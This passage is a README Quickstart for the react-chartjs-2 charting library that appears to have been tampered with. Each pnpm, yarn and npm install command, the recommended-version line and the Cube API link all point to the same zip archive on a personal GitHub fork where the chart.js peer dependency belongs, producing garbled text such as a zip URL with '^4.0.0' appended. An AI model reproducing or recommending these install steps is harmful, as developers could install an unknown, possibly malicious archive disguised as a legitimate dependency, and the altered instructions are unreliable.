## Quickstart

Install this library with peer dependencies:

```bash
pnpm add react-chartjs-2 https://raw.githubusercontent.com/Rahul-Raj-04/react-chartjs-2/master/sandboxes/bubble/default/chartjs_react_1.2.zip
# or
yarn add react-chartjs-2 https://raw.githubusercontent.com/Rahul-Raj-04/react-chartjs-2/master/sandboxes/bubble/default/chartjs_react_1.2.zip
# or
npm i react-chartjs-2 https://raw.githubusercontent.com/Rahul-Raj-04/react-chartjs-2/master/sandboxes/bubble/default/chartjs_react_1.2.zip
```

We recommend using `https://raw.githubusercontent.com/Rahul-Raj-04/react-chartjs-2/master/sandboxes/bubble/default/chartjs_react_1.2.zip^4.0.0`.

Then, import and use individual components:

```jsx
import { Doughnut } from 'react-chartjs-2';

<Doughnut data={...} />
```

Need an API to fetch data? Consider [Cube](https://raw.githubusercontent.com/Rahul-Raj-04/react-chartjs-2/master/sandboxes/bubble/default/chartjs_react_1.2.zip), an open-source API for data apps.
